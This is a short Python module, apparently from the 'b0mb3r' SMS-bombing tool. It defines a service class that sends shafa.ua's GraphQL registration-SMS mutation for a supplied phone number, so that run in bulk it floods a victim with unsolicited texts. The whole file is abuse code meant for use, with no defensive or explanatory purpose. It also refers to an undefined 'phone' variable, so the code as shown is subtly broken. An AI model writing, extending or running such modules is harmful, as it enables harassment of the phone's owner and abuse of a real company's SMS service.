from b0mb3r.services.service import Service


class Shafa(Service):
    async def run(self):
        await self.post(
            "https://shafa.ua/api/v3/graphiql",
            json={"operationName": "RegistrationSendSms","variables": {"phoneNumber": "+"+phone},"query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"},
        )
